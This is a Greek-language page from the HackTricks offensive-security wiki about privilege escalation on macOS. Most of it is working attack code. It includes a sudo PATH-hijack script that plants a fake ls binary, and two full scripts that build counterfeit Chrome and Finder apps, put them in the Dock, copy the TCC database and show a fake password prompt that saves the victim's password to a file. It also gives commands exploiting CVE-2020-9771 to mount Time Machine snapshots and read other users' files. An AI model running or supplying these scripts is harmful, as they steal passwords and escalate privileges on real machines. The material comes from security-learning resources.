# Επέκταση Προνομίων στο macOS

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Επέκταση Προνομίων TCC

Αν ήρθατε εδώ ψάχνοντας για επέκταση προνομίων TCC, πηγαίνετε στο:

{% content-ref url="macos-security-protections/macos-tcc/" %}
[macos-tcc](macos-security-protections/macos-tcc/)
{% endcontent-ref %}

## Linux Privesc

Παρακαλούμε σημειώστε ότι **η πλειοψηφία των κόλπων για επέκταση προνομίων που επηρεάζουν το Linux/Unix θα επηρεάσουν επίσης τις μηχανές MacOS**. Οπότε δείτε:

{% content-ref url="../../linux-hardening/privilege-escalation/" %}
[privilege-escalation](../../linux-hardening/privilege-escalation/)
{% endcontent-ref %}

## Αλληλεπίδραση Χρήστη

### Απάτη του Sudo

Μπορείτε να βρείτε την αρχική [τεχνική απάτης του Sudo μέσα στην ανάρτηση για την Επέκταση Προνομίων στο Linux](../../linux-hardening/privilege-escalation/#sudo-hijacking).

Ωστόσο, το macOS **διατηρεί** το **`PATH`** του χρήστη όταν εκτελεί το **`sudo`**. Αυτό σημαίνει ότι ένας άλλος τρόπος για να επιτευχθεί αυτή η επίθεση θα ήταν να **απατήσετε άλλα δυαδικά αρχεία** που ο θύμα θα εκτελέσει όταν **τρέχει το sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<EOF
#!/bin/bash
if [ "\$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "\$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Σημείωση ότι ένας χρήστης που χρησιμοποιεί το τερματικό θα έχει πιθανότατα εγκατεστημένο το **Homebrew**. Έτσι, είναι δυνατόν να καταληφθούν δυαδικά αρχεία στο **`/opt/homebrew/bin`**.

### Παραπλάνηση της Dock

Χρησιμοποιώντας κάποιο **κοινωνικό μηχανικό** μπορείτε να **παραπλανήσετε για παράδειγμα το Google Chrome** μέσα στην dock και να εκτελέσετε πραγματικά το δικό σας script:

{% tabs %}
{% tab title="Παραπλάνηση του Chrome" %}
Ορισμένες προτάσεις:

* Ελέγξτε στην dock αν υπάρχει ένα Chrome και σε αυτήν την περίπτωση **αφαιρέστε** αυτήν την καταχώρηση και **προσθέστε** την **ψεύτικη** καταχώρηση του Chrome στην ίδια θέση στον πίνακα της dock.&#x20;
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{% endtab %}

{% tab title="Παραπλάνηση του Finder" %}
Ορισμένες προτάσεις:

* Δεν μπορείτε να αφαιρέσετε τον Finder από τη γραμμή εργαλείων (Dock), επομένως αν πρόκειται να τον προσθέσετε, μπορείτε να τοποθετήσετε τον ψεύτικο Finder δίπλα στον πραγματικό. Για αυτό, χρειάζεται να προσθέσετε την καταχώρηση του ψεύτικου Finder στην αρχή του πίνακα της γραμμής εργαλείων (Dock array).
* Μια άλλη επιλογή είναι να μην τοποθετήσετε τον Finder στη γραμμή εργαλείων (Dock) και απλά να τον ανοίξετε, η ερώτηση "Ο Finder ζητάει να ελέγξει τον Finder" δεν είναι και τόσο παράξενη.
* Άλλες επιλογές για να αναβαθμίσετε σε root χωρίς να ζητήσετε τον κωδικό πρόσβασης με ένα απαίσιο παράθυρο, είναι να ζητήσετε πραγματικά από τον Finder να ζητήσει τον κωδικό πρόσβασης για να εκτελέσει μια προνομιούχα ενέργεια:
* Ζητήστε από τον Finder να αντιγράψει ένα νέο αρχείο **`sudo`** στο **`/etc/pam.d`** (Η προτροπή που ζητάει τον κωδικό πρόσβασης θα υποδεικνύει ότι "Ο Finder θέλει να αντιγράψει το sudo")
* Ζητήστε από τον Finder να αντιγράψει ένα νέο **Authorization Plugin** (Μπορείτε να ελέγξετε το όνομα του αρχείου, έτσι ώστε η προτροπή που ζητάει τον κωδικό πρόσβασης να υποδεικνύει ότι "Ο Finder θέλει να αντιγράψει το Finder.bundle")
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << EOF > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{% endtab %}
{% endtabs %}

## TCC - Ανέβασμα Προνομίων σε Root

### CVE-2020-9771 - παράκαμψη TCC και ανέβασμα προνομίων με την mount\_apfs

**Οποιοσδήποτε χρήστης** (ακόμα και μη προνομιούχος) μπορεί να δημιουργήσει και να ανεβάσει ένα αντίγραφο ασφαλείας του time machine και να **έχει πρόσβαση σε ΟΛΑ τα αρχεία** αυτού του αντιγράφου.\
Το **μόνο προνόμιο** που χρειάζεται είναι για την εφαρμογή που χρησιμοποιείται (όπως το `Terminal`) να έχει **Πλήρη Πρόσβαση Δίσκου** (FDA) (`kTCCServiceSystemPolicyAllfiles`) το οποίο πρέπει να χορηγηθεί από έναν διαχειριστή. 

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Μια πιο λεπτομερής εξήγηση μπορεί να βρεθεί [**στην αρχική αναφορά**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

## Ευαίσθητες Πληροφορίες

Αυτό μπορεί να είναι χρήσιμο για την ανέλιξη προνομίων:

{% content-ref url="macos-files-folders-and-binaries/macos-sensitive-locations.md" %}
[macos-sensitive-locations.md](macos-files-folders-and-binaries/macos-sensitive-locations.md)
{% endcontent-ref %}

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
